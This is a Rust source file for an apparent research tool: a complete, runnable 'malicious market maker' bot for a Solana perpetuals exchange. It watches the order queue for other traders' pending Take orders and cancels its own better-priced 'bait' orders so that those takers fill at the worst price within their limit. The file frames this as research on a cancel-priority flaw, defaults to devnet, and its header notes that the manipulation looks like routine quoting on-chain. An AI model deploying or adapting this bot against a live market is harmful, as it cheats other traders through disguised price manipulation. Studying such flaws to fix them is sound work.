//! Malicious market maker: demonstrates the selective-layer-cancellation
//! spoofing attack described in spoofing.md §4.
//!
//! The MM maintains N resting orders ("layers") per side. When a Take from
//! another trader appears in the queue, the MM cancels the most attractive
//! layers on that side — cheap asks for a buy take, expensive bids for a sell
//! take — leaving only the worst-price layer within the taker's limit.
//!
//! Effect: the taker is filled (no obvious failure signal) but at a price
//! systematically worse than the book advertised. The on-chain record shows
//! a routine cancel followed by a normal fill — indistinguishable from
//! ordinary quote management or market impact.
//!
//! This is a RESEARCH and EDUCATION tool demonstrating a vulnerability in the
//! ACE cancel-priority mechanism. Run only on devnet or localnet.
//!
//! Attack variant: spoofing.md §8 Variant B (selective cancel, fill at worse price).
//!   - Buy  take detected → cancel cheap ask layers (bait), keep most expensive within limit
//!   - Sell take detected → cancel expensive bid layers (bait), keep cheapest within limit
//!
//! Example with 5-layer ask ladder, spread=5, oracle=100, spacing=1:
//!   ask_layers[0] = 105  ← bait: best ask, most attractive to buyer
//!   ask_layers[1] = 106
//!   ask_layers[2] = 107
//!   ask_layers[3] = 108
//!   ask_layers[4] = 109  ← real: worst ask, maximises taker's fill price
//!
//!   If a buy Take(limit=108) arrives, layers 0–2 (105/106/107) are cancelled.
//!   Layer 3 (108) stays. Taker fills at 108 instead of sweeping 105→106→107→108.
//!
//! Usage:
//!   cargo run --example malicious_market_maker -- \
//!     --state <STATE_PUBKEY>          (required)
//!     [--rpc <URL>]                   (default: devnet)
//!     [--keypair <PATH>]              (default: ~/.config/solana/id.json)
//!     [--spread <N>]                  price offset from oracle (default: 5)
//!     [--layers <N>]                  resting orders per side (default: 5)
//!     [--layer-spacing <N>]           price delta between layers (default: 1)
//!     [--size <N>]                    units per layer (default: 10)
//!     [--interval-ms <N>]             poll interval (default: 500)
//!     [--deposit <N>]                 one-time deposit on startup (default: 0)

use std::collections::HashSet;
use std::str::FromStr;
use std::time::Duration;

use perps::state::PerpsState;
use solana_commitment_config::CommitmentConfig;
use solana_instruction::{AccountMeta, Instruction};
use solana_keypair::Keypair;
use solana_pubkey::Pubkey;
use solana_rpc_client::nonblocking::rpc_client::RpcClient;
use solana_signer::Signer;
use solana_transaction::Transaction;
use sokoban::NodeAllocatorMap;

const PERPS_PROGRAM_ID: Pubkey =
    solana_pubkey::pubkey!("HBtR4MuDfC6unTEcC1buv5u6ubJ2yRxTpvFWtvAXKwQC");

struct Config {
    state: Pubkey,
    rpc_url: String,
    keypair_path: String,
    spread: u64,
    layers: usize,
    layer_spacing: u64,
    size: u64,
    interval_ms: u64,
    deposit: u64,
}

/// The state of a single resting limit order (one "layer" of the quote ladder).
#[derive(Debug, Clone)]
enum LayerState {
    /// No order — will be placed on the next opportunity.
    Empty,
    /// PlaceOrder is queued; waiting for crank to land on the book.
    Pending { price: u64, seq: u64 },
    /// Order is live on the book and can be traded against.
    Live { price: u64, seq: u64 },
    /// Cancel is queued; order will disappear after the next crank.
    Cancelling { price: u64, seq: u64 },
}

impl LayerState {
    fn is_live(&self) -> bool {
        matches!(self, LayerState::Live { .. })
    }

    fn is_empty(&self) -> bool {
        matches!(self, LayerState::Empty)
    }
}

struct MmState {
    /// bid_layers[0] = best bid (highest price, closest to oracle — the bait layer).
    bid_layers: Vec<LayerState>,
    /// ask_layers[0] = best ask (lowest price, closest to oracle — the bait layer).
    ask_layers: Vec<LayerState>,
    next_seq: u64,
}

impl MmState {
    fn new(layers: usize) -> Self {
        Self {
            bid_layers: vec![LayerState::Empty; layers],
            ask_layers: vec![LayerState::Empty; layers],
            next_seq: 2000,
        }
    }

    fn alloc_seq(&mut self) -> u64 {
        let s = self.next_seq;
        self.next_seq += 1;
        s
    }
}

struct CancelOp {
    layer_idx: usize,
    side: u64,  // 0 = bid, 1 = ask
    price: u64,
    seq: u64,
}

struct PlaceOp {
    layer_idx: usize,
    side: u64,  // 0 = bid, 1 = ask
    price: u64,
    seq: u64,
}

#[tokio::main]
async fn main() {
    let cfg = parse_config();
    let keypair = load_keypair(&cfg.keypair_path);
    let client = RpcClient::new_with_commitment(cfg.rpc_url.clone(), CommitmentConfig::confirmed());
    let my_pubkey = keypair.pubkey();
    let my_bytes: [u8; 32] = my_pubkey.to_bytes();

    println!("=== ACE Perps Malicious Market Maker ===");
    println!("  Demonstrates spoofing.md §4 selective layer cancellation");
    println!("  FOR RESEARCH / EDUCATION ONLY — devnet/localnet only");
    println!();
    println!("State    : {}", cfg.state);
    println!("MM key   : {}", my_pubkey);
    println!("RPC      : {}", cfg.rpc_url);
    println!("Spread   : ±{}", cfg.spread);
    println!("Layers   : {} per side", cfg.layers);
    println!("Spacing  : {} price units between layers", cfg.layer_spacing);
    println!("Size     : {} per layer", cfg.size);
    println!();
    println!("Strategy:");
    println!(
        "  {} ask layers starting at oracle+{}, spaced {} apart",
        cfg.layers, cfg.spread, cfg.layer_spacing
    );
    println!(
        "  ask[0]=oracle+{} (bait)  ask[{}]=oracle+{} (real)",
        cfg.spread,
        cfg.layers - 1,
        cfg.spread + (cfg.layers as u64 - 1) * cfg.layer_spacing
    );
    println!("  On buy take:  cancel cheap asks → taker fills at most expensive layer");
    println!("  On sell take: cancel expensive bids → taker fills at cheapest layer");
    println!();

    if cfg.deposit > 0 {
        println!("Depositing {} collateral...", cfg.deposit);
        match send_sync_ix(&client, &keypair, &cfg.state, 0, cfg.deposit).await {
            Ok(sig) => println!("Deposit confirmed: {sig}"),
            Err(e) => eprintln!("Deposit failed: {e}"),
        }
    }

    let mut mm = MmState::new(cfg.layers);
    recover_state(&client, &cfg.state, &my_bytes, &mut mm).await;

    loop {
        match run_iteration(&client, &keypair, &cfg, &my_bytes, &mut mm).await {
            Ok(()) => {}
            Err(e) => eprintln!("[mm error] {e}"),
        }
        tokio::time::sleep(Duration::from_millis(cfg.interval_ms)).await;
    }
}

async fn run_iteration(
    client: &RpcClient,
    keypair: &Keypair,
    cfg: &Config,
    my_bytes: &[u8; 32],
    mm: &mut MmState,
) -> Result<(), Box<dyn std::error::Error>> {
    let account = client.get_account(&cfg.state).await?;
    if account.data.len() < std::mem::size_of::<PerpsState>() {
        return Err("state account too small".into());
    }
    let state: &PerpsState =
        bytemuck::try_from_bytes(&account.data).map_err(|e| format!("deserialize: {e}"))?;

    let oracle = state.oracle_price;

    // ── Reconcile all layer states against on-chain reality ────────────────────
    for i in 0..cfg.layers {
        mm.bid_layers[i] = reconcile_layer(mm.bid_layers[i].clone(), my_bytes, state, 0);
        mm.ask_layers[i] = reconcile_layer(mm.ask_layers[i].clone(), my_bytes, state, 1);
    }

    // ── Detect pending Takes from other traders ────────────────────────────────
    // Collect (side, limit_price) for every Take NOT submitted by us.
    let pending_takes: Vec<(u64, u64)> = state
        .async_queue
        .iter()
        .filter(|(_, q)| q.ix_type == 3)
        .map(|(_, q)| (q.side, q.price))
        .collect();

    // ── Target prices for each layer ───────────────────────────────────────────
    // ask_layers[i] = oracle + spread + i * spacing  (layer 0 = best/cheapest = bait)
    // bid_layers[i] = oracle - spread - i * spacing  (layer 0 = best/highest  = bait)
    let target_ask: Vec<u64> = (0..cfg.layers)
        .map(|i| oracle + cfg.spread + i as u64 * cfg.layer_spacing)
        .collect();
    let target_bid: Vec<u64> = (0..cfg.layers)
        .map(|i| oracle.saturating_sub(cfg.spread + i as u64 * cfg.layer_spacing))
        .collect();

    // ── Build cancel operations ────────────────────────────────────────────────
    let mut cancel_ops: Vec<CancelOp> = Vec::new();
    let mut ask_cancel_set: HashSet<usize> = HashSet::new();
    let mut bid_cancel_set: HashSet<usize> = HashSet::new();

    // 1. Cancel stale layers whose price has drifted from the current target.
    for i in 0..cfg.layers {
        if let LayerState::Live { price, seq } = mm.ask_layers[i].clone() {
            if price != target_ask[i] {
                cancel_ops.push(CancelOp { layer_idx: i, side: 1, price, seq });
                ask_cancel_set.insert(i);
            }
        }
        if let LayerState::Live { price, seq } = mm.bid_layers[i].clone() {
            if price != target_bid[i] {
                cancel_ops.push(CancelOp { layer_idx: i, side: 0, price, seq });
                bid_cancel_set.insert(i);
            }
        }
    }

    // 2. Spoofing: react to pending Takes by cancelling bait layers.
    for &(take_side, limit_price) in &pending_takes {
        if take_side == 0 {
            // Buy take sweeps asks cheapest-first up to limit_price.
            // Cancel all cheap ask layers within the limit, keep only the most expensive.
            // The taker fills entirely at the worst available price.
            for idx in bait_ask_indices(&mm.ask_layers, limit_price) {
                if ask_cancel_set.contains(&idx) {
                    continue; // already being cancelled (stale)
                }
                if let LayerState::Live { price, seq } = mm.ask_layers[idx].clone() {
                    println!(
                        "[spoof] buy take limit={limit_price}: cancel ask[{idx}] @ {price} \
                         (bait removed → taker forced to worst layer)"
                    );
                    cancel_ops.push(CancelOp { layer_idx: idx, side: 1, price, seq });
                    ask_cancel_set.insert(idx);
                }
            }
        } else {
            // Sell take sweeps bids most-expensive-first down to limit_price.
            // Cancel all expensive bid layers within range, keep only the cheapest.
            for idx in bait_bid_indices(&mm.bid_layers, limit_price) {
                if bid_cancel_set.contains(&idx) {
                    continue;
                }
                if let LayerState::Live { price, seq } = mm.bid_layers[idx].clone() {
                    println!(
                        "[spoof] sell take limit={limit_price}: cancel bid[{idx}] @ {price} \
                         (bait removed → taker forced to worst layer)"
                    );
                    cancel_ops.push(CancelOp { layer_idx: idx, side: 0, price, seq });
                    bid_cancel_set.insert(idx);
                }
            }
        }
    }

    // ── Build place operations (requote Empty layers) ──────────────────────────
    let mut place_ops: Vec<PlaceOp> = Vec::new();
    let my_margin = state.margins.get_balance(my_bytes);
    let mut margin_reserved: u64 = 0;

    for i in 0..cfg.layers {
        if mm.ask_layers[i].is_empty() {
            let price = target_ask[i];
            let margin_needed = price * cfg.size / 10;
            if my_margin >= margin_reserved + margin_needed {
                let seq = mm.alloc_seq();
                place_ops.push(PlaceOp { layer_idx: i, side: 1, price, seq });
                margin_reserved += margin_needed;
            }
        }
        if mm.bid_layers[i].is_empty() {
            let price = target_bid[i];
            let margin_needed = price * cfg.size / 10;
            if my_margin >= margin_reserved + margin_needed {
                let seq = mm.alloc_seq();
                place_ops.push(PlaceOp { layer_idx: i, side: 0, price, seq });
                margin_reserved += margin_needed;
            }
        }
    }

    // ── Status log ────────────────────────────────────────────────────────────
    let live_bids = mm.bid_layers.iter().filter(|l| l.is_live()).count();
    let live_asks = mm.ask_layers.iter().filter(|l| l.is_live()).count();
    let n = cfg.layers;
    let t = pending_takes.len();
    let c = cancel_ops.len();
    let p = place_ops.len();
    println!(
        "[mm] oracle={oracle}  bids={live_bids}/{n}  asks={live_asks}/{n}  \
         margin={my_margin}  takes={t}  cancels={c}  places={p}"
    );

    if cancel_ops.is_empty() && place_ops.is_empty() {
        return Ok(());
    }

    // ── Execute cancel batch and place batch concurrently ─────────────────────
    let (cancel_res, place_res) = tokio::join!(
        send_cancel_batch(client, keypair, &cfg.state, &cancel_ops),
        send_place_batch(client, keypair, &cfg.state, &place_ops, cfg.size),
    );

    // ── Apply results ─────────────────────────────────────────────────────────
    match cancel_res {
        Ok(ref sig) if !cancel_ops.is_empty() => {
            println!("[mm] cancel batch confirmed: {sig}");
            for op in &cancel_ops {
                let layer = if op.side == 0 {
                    &mut mm.bid_layers[op.layer_idx]
                } else {
                    &mut mm.ask_layers[op.layer_idx]
                };
                *layer = LayerState::Cancelling { price: op.price, seq: op.seq };
            }
        }
        Err(e) => eprintln!("[mm] cancel batch failed: {e}"),
        Ok(_) => {}
    }

    match place_res {
        Ok(ref sig) if !place_ops.is_empty() => {
            println!("[mm] place batch confirmed: {sig}");
            for op in &place_ops {
                let layer = if op.side == 0 {
                    &mut mm.bid_layers[op.layer_idx]
                } else {
                    &mut mm.ask_layers[op.layer_idx]
                };
                *layer = LayerState::Pending { price: op.price, seq: op.seq };
            }
        }
        Err(e) => eprintln!("[mm] place batch failed: {e}"),
        Ok(_) => {}
    }

    Ok(())
}

// ─── Spoof helpers ─────────────────────────────────────────────────────────────

/// Returns layer indices to cancel when reacting to a buy Take with `limit_price`.
///
/// A buy take sweeps asks cheapest-first up to `limit_price`. We cancel all
/// Live ask layers within the limit EXCEPT the most expensive one, forcing
/// the taker to fill entirely at the worst available price.
///
/// Returns an empty vec if ≤1 Live layers exist within the limit (nothing to gain).
fn bait_ask_indices(layers: &[LayerState], limit_price: u64) -> Vec<usize> {
    let mut within: Vec<(u64, usize)> = layers
        .iter()
        .enumerate()
        .filter_map(|(i, l)| match l {
            LayerState::Live { price, .. } if *price <= limit_price => Some((*price, i)),
            _ => None,
        })
        .collect();

    if within.len() <= 1 {
        return vec![];
    }

    // Sort ascending by price. The last entry (most expensive within limit) is kept.
    within.sort_by_key(|&(p, _)| p);
    within[..within.len() - 1].iter().map(|&(_, i)| i).collect()
}

/// Returns layer indices to cancel when reacting to a sell Take with `limit_price`.
///
/// A sell take sweeps bids most-expensive-first down to `limit_price`. We cancel
/// all Live bid layers within range EXCEPT the cheapest one, forcing the taker
/// to fill at the worst available price.
fn bait_bid_indices(layers: &[LayerState], limit_price: u64) -> Vec<usize> {
    let mut within: Vec<(u64, usize)> = layers
        .iter()
        .enumerate()
        .filter_map(|(i, l)| match l {
            LayerState::Live { price, .. } if *price >= limit_price => Some((*price, i)),
            _ => None,
        })
        .collect();

    if within.len() <= 1 {
        return vec![];
    }

    // Sort descending by price. The last entry (cheapest within range) is kept.
    within.sort_by_key(|&(p, _)| std::cmp::Reverse(p));
    within[..within.len() - 1].iter().map(|&(_, i)| i).collect()
}

// ─── Reconcile ─────────────────────────────────────────────────────────────────

fn reconcile_layer(
    current: LayerState,
    my_bytes: &[u8; 32],
    state: &PerpsState,
    side: u64,
) -> LayerState {
    match current {
        LayerState::Pending { price, seq } => {
            if is_on_book_by_seq(state, my_bytes, seq, side) {
                LayerState::Live { price, seq }
            } else if is_place_seq_in_queue(state, my_bytes, seq, side) {
                LayerState::Pending { price, seq }
            } else {
                LayerState::Empty // PlaceOrder dropped
            }
        }
        LayerState::Live { price, seq } => {
            if is_on_book_by_seq(state, my_bytes, seq, side) {
                LayerState::Live { price, seq }
            } else {
                LayerState::Empty // filled or externally cancelled
            }
        }
        LayerState::Cancelling { price, seq } => {
            if is_on_book_by_seq(state, my_bytes, seq, side) {
                LayerState::Cancelling { price, seq } // cancel not cranked yet
            } else {
                LayerState::Empty // cancel processed
            }
        }
        LayerState::Empty => LayerState::Empty,
    }
}

// ─── Book / queue helpers ──────────────────────────────────────────────────────

fn is_on_book_by_seq(state: &PerpsState, my_bytes: &[u8; 32], seq: u64, side: u64) -> bool {
    if side == 0 {
        state
            .orderbook
            .bids
            .iter()
            .any(|(key, order)| &order.owner == my_bytes && key.seq == seq)
    } else {
        state
            .orderbook
            .asks
            .iter()
            .any(|(key, order)| &order.owner == my_bytes && key.seq == seq)
    }
}

fn is_place_seq_in_queue(
    state: &PerpsState,
    my_bytes: &[u8; 32],
    seq: u64,
    side: u64,
) -> bool {
    state.async_queue.iter().any(|(_, q)| {
        q.ix_type == 2 && &q.user == my_bytes && q.side == side && q.order_seq == seq
    })
}

// ─── Startup recovery ──────────────────────────────────────────────────────────

async fn recover_state(
    client: &RpcClient,
    state_pubkey: &Pubkey,
    my_bytes: &[u8; 32],
    mm: &mut MmState,
) {
    let Ok(account) = client.get_account(state_pubkey).await else {
        return;
    };
    if account.data.len() < std::mem::size_of::<PerpsState>() {
        return;
    }
    let Ok(state) = bytemuck::try_from_bytes::<PerpsState>(&account.data) else {
        return;
    };

    // Recover live bids — assign each to the next Empty bid slot
    for (key, order) in state.orderbook.bids.iter() {
        if &order.owner != my_bytes {
            continue;
        }
        let price = u64::MAX - key.price_key;
        let seq = key.seq;
        mm.next_seq = mm.next_seq.max(seq + 1);
        if let Some(slot) = mm.bid_layers.iter_mut().find(|l| l.is_empty()) {
            println!("[recover] live bid price={price} seq={seq}");
            *slot = LayerState::Live { price, seq };
        }
    }

    // Recover live asks
    for (key, order) in state.orderbook.asks.iter() {
        if &order.owner != my_bytes {
            continue;
        }
        let price = key.price_key;
        let seq = key.seq;
        mm.next_seq = mm.next_seq.max(seq + 1);
        if let Some(slot) = mm.ask_layers.iter_mut().find(|l| l.is_empty()) {
            println!("[recover] live ask price={price} seq={seq}");
            *slot = LayerState::Live { price, seq };
        }
    }

    // Recover pending queue entries (PlaceOrders and Cancels from us)
    for (_, q) in state.async_queue.iter() {
        if &q.user != my_bytes {
            continue;
        }
        mm.next_seq = mm.next_seq.max(q.order_seq + 1);
        match q.ix_type {
            2 => {
                // PlaceOrder in queue — assign to the next Empty slot on that side
                let layers = if q.side == 0 {
                    &mut mm.bid_layers
                } else {
                    &mut mm.ask_layers
                };
                if let Some(slot) = layers.iter_mut().find(|l| l.is_empty()) {
                    println!(
                        "[recover] queued PlaceOrder side={} price={} seq={}",
                        q.side, q.price, q.order_seq
                    );
                    *slot = LayerState::Pending { price: q.price, seq: q.order_seq };
                }
            }
            1 => {
                // Cancel in queue — find the Live layer at this price and mark Cancelling
                let layers = if q.side == 0 {
                    &mut mm.bid_layers
                } else {
                    &mut mm.ask_layers
                };
                for slot in layers.iter_mut() {
                    if let LayerState::Live { price, seq } = *slot {
                        if price == q.price {
                            println!(
                                "[recover] queued Cancel side={} price={price} seq={seq}",
                                q.side
                            );
                            *slot = LayerState::Cancelling { price, seq };
                            break;
                        }
                    }
                }
            }
            _ => {}
        }
    }
}

// ─── Instruction builders ──────────────────────────────────────────────────────

/// Send all cancels in a single transaction. Empty slice → returns immediately.
async fn send_cancel_batch(
    client: &RpcClient,
    keypair: &Keypair,
    state: &Pubkey,
    ops: &[CancelOp],
) -> Result<String, Box<dyn std::error::Error>> {
    if ops.is_empty() {
        return Ok(String::new());
    }
    let accounts = vec![
        AccountMeta::new(*state, false),
        AccountMeta::new_readonly(keypair.pubkey(), true),
    ];
    let ixs: Vec<Instruction> = ops
        .iter()
        .map(|op| {
            let mut data = vec![1u8]; // route = async
            data.extend_from_slice(&1u64.to_le_bytes()); // ix_type = Cancel
            data.extend_from_slice(&op.price.to_le_bytes());
            data.extend_from_slice(&0u64.to_le_bytes()); // size unused for cancel
            data.extend_from_slice(&op.side.to_le_bytes());
            data.extend_from_slice(&op.seq.to_le_bytes());
            Instruction { program_id: PERPS_PROGRAM_ID, accounts: accounts.clone(), data }
        })
        .collect();
    send_tx(client, keypair, &ixs).await
}

/// Send all placements in a single transaction. Empty slice → returns immediately.
async fn send_place_batch(
    client: &RpcClient,
    keypair: &Keypair,
    state: &Pubkey,
    ops: &[PlaceOp],
    size: u64,
) -> Result<String, Box<dyn std::error::Error>> {
    if ops.is_empty() {
        return Ok(String::new());
    }
    let accounts = vec![
        AccountMeta::new(*state, false),
        AccountMeta::new_readonly(keypair.pubkey(), true),
    ];
    let ixs: Vec<Instruction> = ops
        .iter()
        .map(|op| {
            let mut data = vec![1u8]; // route = async
            data.extend_from_slice(&2u64.to_le_bytes()); // ix_type = PlaceOrder
            data.extend_from_slice(&op.price.to_le_bytes());
            data.extend_from_slice(&size.to_le_bytes());
            data.extend_from_slice(&op.side.to_le_bytes());
            data.extend_from_slice(&op.seq.to_le_bytes());
            Instruction { program_id: PERPS_PROGRAM_ID, accounts: accounts.clone(), data }
        })
        .collect();
    send_tx(client, keypair, &ixs).await
}

async fn send_sync_ix(
    client: &RpcClient,
    keypair: &Keypair,
    state: &Pubkey,
    ix_type: u64,
    param: u64,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut data = vec![0u8]; // route = sync
    data.extend_from_slice(&ix_type.to_le_bytes());
    data.extend_from_slice(&param.to_le_bytes());
    let ix = Instruction {
        program_id: PERPS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(*state, false),
            AccountMeta::new_readonly(keypair.pubkey(), true),
        ],
        data,
    };
    send_tx(client, keypair, &[ix]).await
}

async fn send_tx(
    client: &RpcClient,
    keypair: &Keypair,
    ixs: &[Instruction],
) -> Result<String, Box<dyn std::error::Error>> {
    let blockhash = client.get_latest_blockhash().await?;
    let tx = Transaction::new_signed_with_payer(
        ixs,
        Some(&keypair.pubkey()),
        &[keypair],
        blockhash,
    );
    let sig = client.send_and_confirm_transaction(&tx).await?;
    Ok(sig.to_string())
}

// ─── Config / keypair helpers ──────────────────────────────────────────────────

fn parse_config() -> Config {
    let args: Vec<String> = std::env::args().collect();

    let state_str = arg_val(&args, "--state")
        .or_else(|| std::env::var("PERPS_STATE_ACCOUNT").ok())
        .expect("Required: --state <PUBKEY>  or  PERPS_STATE_ACCOUNT=<PUBKEY>");

    Config {
        state: Pubkey::from_str(&state_str).expect("invalid state pubkey"),
        rpc_url: arg_val(&args, "--rpc")
            .or_else(|| std::env::var("PERPS_RPC_URL").ok())
            .unwrap_or_else(|| "https://api.devnet.solana.com".to_string()),
        keypair_path: arg_val(&args, "--keypair")
            .or_else(|| std::env::var("PERPS_KEYPAIR").ok())
            .unwrap_or_else(default_keypair_path),
        spread: arg_val(&args, "--spread")
            .and_then(|s| s.parse().ok())
            .unwrap_or(5),
        layers: arg_val(&args, "--layers")
            .and_then(|s| s.parse().ok())
            .unwrap_or(5),
        layer_spacing: arg_val(&args, "--layer-spacing")
            .and_then(|s| s.parse().ok())
            .unwrap_or(1),
        size: arg_val(&args, "--size")
            .and_then(|s| s.parse().ok())
            .unwrap_or(10),
        interval_ms: arg_val(&args, "--interval-ms")
            .or_else(|| std::env::var("PERPS_INTERVAL_MS").ok())
            .and_then(|s| s.parse().ok())
            .unwrap_or(500),
        deposit: arg_val(&args, "--deposit")
            .and_then(|s| s.parse().ok())
            .unwrap_or(0),
    }
}

fn arg_val(args: &[String], flag: &str) -> Option<String> {
    let pos = args.iter().position(|a| a == flag)?;
    args.get(pos + 1).cloned()
}

fn default_keypair_path() -> String {
    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .unwrap_or_else(|_| ".".to_string());
    format!("{home}/.config/solana/id.json")
}

fn load_keypair(path: &str) -> Keypair {
    solana_keypair::read_keypair_file(path)
        .unwrap_or_else(|e| panic!("cannot load keypair from '{path}': {e}"))
}
